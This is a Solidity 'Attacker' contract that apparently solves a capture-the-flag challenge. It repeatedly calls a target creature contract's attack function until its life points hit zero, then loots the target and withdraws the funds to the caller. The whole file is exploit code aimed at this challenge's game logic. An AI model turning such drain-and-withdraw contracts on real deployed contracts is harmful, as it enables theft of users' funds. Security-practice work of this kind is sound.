pragma solidity ^0.8.13;

interface ICreature {
    function lifePoints() external view returns (uint256);
    function attack(uint256 _damage) external;
    function loot() external;
}

contract Attacker {
    ICreature public immutable target;

    constructor(address _target) payable {
        target = ICreature(_target);
    }

    function kill(uint256 hit, uint256 maxIters) external {
        for (uint256 i = 0; i < maxIters; i++) {
            if (target.lifePoints() == 0) break;
            target.attack(hit);
        }
    }

    function takeLoot() external {
        target.loot();
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

